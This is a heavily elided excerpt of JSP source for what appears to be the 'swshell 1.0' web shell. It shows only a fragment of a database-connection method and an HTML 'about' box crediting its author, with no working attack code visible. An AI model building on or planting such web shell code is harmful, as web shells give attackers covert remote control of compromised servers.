...
public boolean DBConnect(String User, String Password) {
	...
	if (_url != null) {
		try {
			...
			System.out.println(_url+""+e.getMessage());
			bRet = false;
		}
	}
...
<table border="0" align="center" width="600" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
	<tr bgcolor="#FFFFFF">
		<td align="center">关于 swshell 1.0</td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td> </td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td align="right">created by <a href="#">从零开始</a> and welcome to <a href="http://songwie.com" target="_blank">从零开始</a></td>
	</tr>
</table>
<%
//==========================================================================================
